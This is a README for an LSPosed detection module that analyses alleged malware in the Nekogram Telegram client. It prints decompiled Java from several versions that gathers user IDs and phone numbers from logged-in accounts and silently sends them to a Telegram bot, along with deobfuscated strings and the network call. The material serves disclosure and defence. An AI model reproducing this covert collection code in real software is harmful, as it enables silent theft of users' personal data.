# NekoCheck

Looking at the [issue #336](https://github.com/Nekogram/Nekogram/issues/336) by [@repinek](https://github.com/repinek) on the official Nekogram repository, I decided to dig deeper into that.

Turns out malware was embedded in the app since at least October 2024. At first it was limited to China (+86) and +85x countries (Hong Kong, North Korea, Macau, Cambodia, Laos) but since November 2025 it sends data about everyone. It doesn't matter if you uninstall the app right now, they already have your data.<br>
11<b>.2.3</b><br>
12<b>.2.3</b><br>
I wonder what they were planning for 13.2.3.

## LSPosed Module

An LSPosed module that allows you to track when your data is being sent to Nekogram's bot. These are the 3 manual triggers I was testing on (there are also other triggers like time-based 24h cache etc.):

| Action | How to trigger |
|---|---|
| Check for updates | Settings → Neko Settings → (Other) → Check for update |
| Cloud sync | Settings → Neko Settings → Cloud icon (top right) |
| Long-press profile | Open someone's profile → long press on the ID field |

Each trigger causes the app to call a function which collects user IDs and phone numbers from all logged-in accounts and sends them to `@nekonotificationbot` via a silent inline query.

| Check for updates | Cloud sync | Long-press profile |
|---|---|---|
| <img src="https://github.com/user-attachments/assets/96f45f2d-ec52-44d1-bb75-95533870ebef" width="250"> | <img src="https://github.com/user-attachments/assets/d579063d-63c8-4cee-a449-46dbe3680cd2" width="250"> | <img src="https://github.com/user-attachments/assets/bbfa8403-cb84-4aca-88a4-e31d9b363b31" width="250"> |

Fields being sent (spoofed):

![screenshot6](https://github.com/user-attachments/assets/38e0afe2-179e-4822-bd75-e455d638f767)

Google's review... yeah sure

![screenshot4](https://github.com/user-attachments/assets/f3f2e97c-46de-49d2-b017-1d3b16530dac)

## Versions Analysis

I analyzed all of the Nekogram Telegram versions and tracked when they included malware:

| Version | Date | Source | Affected |
|---|---|---|---|
| 11.1.3 | Sep 13, 2024 | [Telegram](https://t.me/NekogramAPKs/829) | Not affected |
| 11.2.3 | Oct 25, 2024 | [Telegram](https://t.me/NekogramAPKs/837) | CN / +85x only |
| 12.2.3 | Nov 20, 2025 | [Telegram](https://t.me/NekogramAPKs/915) | All users |
| 12.5.2 | Mar 19, 2026 | [Telegram](https://t.me/NekogramAPKs/946) | All users |
| 12.5.2 | Mar 30, 2026 | [Google Play](https://play.google.com/store/apps/details?id=tw.nekomimi.nekogram) | All users |

Looks like this was actually added in version **11.2.3** on **October 25, 2024**. The decompiled function:

```java
public static void j() {
    AbstractC7144el4 abstractC7144el4O;
    String str;
    try {
        if (n) {  // run-once guard
            return;
        }
        n = true;
        HashMap map = new HashMap();
        boolean z = false;
        for (int i2 = 0; i2 < 8; i2++) {
            W wS = W.s(i2);
            if (wS.z() && (abstractC7144el4O = wS.o()) != null && (str = abstractC7144el4O.f) != null) {
                map.put(String.valueOf(abstractC7144el4O.a), str);  // userId → phone
                if (str.startsWith(AbstractC14253st0.a(-7227024950811419380L)) || str.startsWith(AbstractC14253st0.a(-7227024946516452084L)))  // "86" || "85"
                {
                    z = true;
                }
            }
        }
        if (AbstractC6421d92.B0 || z) {
            C2287Le1.e(W.b0).i(m, f + AbstractC14253st0.a(-7227025028120830708L) + AbstractC3789Tl.b.r(map), new Utilities.b() {
                @Override
                public final void a(Object obj, Object obj2) {
                    AbstractC10751mN0.i((ArrayList) obj, (String) obj2);
                }
            });
        }
    } catch (Exception unused) {
    }
}
```

I also deobfuscated some strings:

| Encrypted key | Decrypted value | Purpose |
|---|---|---|
| `-7227024950811419380` | `86` | China country code |
| `-7227024946516452084` | `85` | +85x country code prefix |
| `-7227026067502916340` | `nekonotificationbot` | Bot receiving data |
| `-7227024310861292276` | `741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1` | 64-char hex payload prefix |

Back then it only targeted users with phone numbers from China (`+86`) or `+85x` countries: Hong Kong (+852), North Korea (+850), Macau (+853), Cambodia (+855), Laos (+856). If any of the 8 logged-in accounts matches, `z` is set to `true`. There is an additional check for `B0` = `isChineseUser` resource, looks like it's set when building the APK? I didn't look further into that.

On **November 20, 2025** in version **12.2.3** they enabled malware for all users (still leaving some checks in the code, but they were ineffective):

```java
public static void f() {
    TLRPC.qd1 qd1VarO;
    String str;
    try {
        if (k) {  // run-once guard
            return;
        }
        k = true;
        HashMap map = new HashMap();
        for (int i2 = 0; i2 < 8; i2++) {
            b1 b1VarS = b1.s(i2);
            if (b1VarS.A() && (qd1VarO = b1VarS.o()) != null && (str = qd1VarO.f) != null) {
                map.put(String.valueOf(qd1VarO.a), str);  // userId → phone
                if (!str.startsWith(jk4.a(-7227025869934420724L))) {
                    str.startsWith(jk4.a(-7227025831279715060L));  // result ignored
                }
            }
        }
        pb7.f(b1.p0).j(j, e + jk4.a(-7227025844164616948L) + ra0.c.r(map), new Utilities.b() {
            @Override
            public final void a(Object obj, Object obj2) {
                uo5.a((ArrayList) obj, (String) obj2);
            }
        });
    } catch (Exception unused) {
    }
}
```

The latest version **12.5.2** (**65970**) sends the same data but without the dead CN / +85x checks:

```java
public static void g() {
    TLRPC.sf1 sf1VarO;
    String str;
    try {
        if (l) {  // run-once guard
            return;
        }
        l = true;
        HashMap map = new HashMap();
        for (int i2 = 0; i2 < 8; i2++) {
            c1 c1VarR = c1.r(i2);
            if (c1VarR.A() && (sf1VarO = c1VarR.o()) != null && (str = sf1VarO.f) != null) {
                map.put(String.valueOf(sf1VarO.a), str);  // userId → phone
            }
        }
        dc7.h(c1.q0).l(k, e + lj4.a(-7227028227871466228L) + cb0.c.r(map), new Utilities.b() {
            @Override
            public final void a(Object obj, Object obj2) {
                uo5.a((ArrayList) obj, (String) obj2);
            }
        });
    } catch (Exception unused) {
    }
}
```

The latest **Google Play 12.5.2** (**65972**) build contains the same malware with names rotated by obfuscation (older Google Play builds most likely contain it too):

```java
public static void g() {
    TLRPC.sf1 sf1VarO;
    String str;
    try {
        if (l) {  // run-once guard
            return;
        }
        l = true;
        HashMap map = new HashMap();
        for (int i2 = 0; i2 < 8; i2++) {
            c1 c1VarR = c1.r(i2);
            if (c1VarR.A() && (sf1VarO = c1VarR.o()) != null && (str = sf1VarO.f) != null) {
                map.put(String.valueOf(sf1VarO.a), str);  // userId → phone
            }
        }
        hd7.h(c1.q0).l(k, e + yj4.a(-7227028227871466228L) + nb0.c.r(map), new Utilities.b() {
            @Override
            public final void a(Object obj, Object obj2) {
                lp5.a((ArrayList) obj, (String) obj2);
            }
        });
    } catch (Exception unused) {
    }
}
```

## How the module works

The module hooks at two levels:

**Network hook (works on all versions):** Malware sends data via `messages.getInlineBotResults` which goes through `ConnectionsManager.sendRequest`. Since `org.telegram.tgnet.ConnectionsManager` is not obfuscated, I hook into `sendRequest` and scan for the prefix `741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1`, displaying a toast on every send. User ID and phone number can be spoofed, see [config](#config).

Point in the code:
```java
TLRPC.gi0 gi0Var = new TLRPC.gi0();  // messages.getInlineBotResults
gi0Var.e = str;                       // payload prefix + data
gi0Var.b = getMessagesController().bb(sf1VarTb);
gi0Var.f = "";
gi0Var.c = new TLRPC.ux();
getConnectionsManager().sendRequest(gi0Var, requestDelegate, 2);  // network hook intercepts here
```

It uses `messages.getInlineBotResults`, which leaves no trace in chat history.

**Version-specific hooks:** Obfuscated names change between updates, so some hooks are only defined for the versions from the maps:

<img width="1022" height="307" alt="screenshot5" src="https://github.com/user-attachments/assets/f10f5c8a-fb9e-41a0-9400-534c7dd204af" />

These hooks log the full execution chain — from trigger, through data collection, to bot query. There are also configurable hooks: `reset_once_guard` resets the run-once guard so data is sent on every trigger instead of just once, and `bypass_country_filter` bypasses the CN / +85x restriction on 11.2.3, see [config](#config).

All logging uses logcat tag `NekoCheck`.

### Config

The module stores its config in Nekogram's SharedPreferences at:
```
/data/data/tw.nekomimi.nekogram/shared_prefs/nekocheck.xml
```

| Key | Type | Default | Description |
|---|---|---|---|
| `reset_once_guard` | boolean | `true` | Reset the run-once flag so data is sent on every trigger |
| `bypass_country_filter` | boolean | `true` | Bypass the CN / +85x filter in version 11.2.3 |
| `spoof_0` to `spoof_7` | String | `""` | Spoof `userId:phone` |

Spoofing `userId:phone` completely replaces original values — you can send 1 to 8 fake accounts regardless of how many are actually logged in.

Example config (`/data/data/tw.nekomimi.nekogram/shared_prefs/nekocheck.xml`):
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="reset_once_guard" value="true" />
    <boolean name="bypass_country_filter" value="true" />
    <string name="spoof_0">000000001:30123456789</string>
    <string name="spoof_1">000000002:30987654321</string>
    <string name="spoof_2"></string>
    <string name="spoof_3"></string>
    <string name="spoof_4"></string>
    <string name="spoof_5"></string>
    <string name="spoof_6"></string>
    <string name="spoof_7"></string>
</map>
```

This would send `{"000000001":"30123456789","000000002":"30987654321"}` to the bot instead of your real data.
